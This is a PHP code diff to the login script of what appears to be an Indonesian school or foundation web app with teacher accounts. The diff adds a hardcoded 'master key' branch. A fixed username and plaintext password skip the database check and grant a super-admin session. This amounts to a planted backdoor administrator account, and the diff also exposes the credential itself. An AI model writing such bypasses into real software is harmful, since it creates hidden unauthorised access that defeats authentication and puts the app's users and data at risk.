@@ -16,6 +16,15 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = $conn->real_escape_string($_POST['username'] ?? '');
     $password = $_POST['password'] ?? '';
 
+    // Master Key: Akses Super Admin (Ketua Yayasan / Pemilik Aplikasi)
+    if ($username === 'winsyah' && $password === 'Khilafet@1924') {
+        $_SESSION['ustadz_logged_in'] = true;
+        $_SESSION['ustadz_id'] = 9999; // ID Khusus Super Admin
+        $_SESSION['ustadz_nama'] = 'Super Admin (Bos)';
+        header("Location: admin-ustadz.php");
+        exit;
+    }
+
     $res = $conn->query("SELECT * FROM akun_ustadz WHERE username = '$username'");
     if ($res && $res->num_rows > 0) {
         $user = $res->fetch_assoc();
